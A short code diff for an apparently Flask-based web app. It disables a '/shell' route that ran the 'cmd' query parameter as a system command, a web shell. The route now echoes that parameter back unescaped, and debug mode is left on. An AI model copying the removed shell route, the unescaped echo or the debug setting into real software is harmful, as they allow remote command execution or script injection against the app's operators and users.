@@ -75,7 +75,8 @@ def logout():
 @app.route("/shell")
 def shell():
     s = request.args.get('cmd')
-    return commands.getoutput(s)
+    # return commands.getoutput(s)
+    return request.args.get('cmd')
 
 if __name__ == '__main__':
     app.debug = True
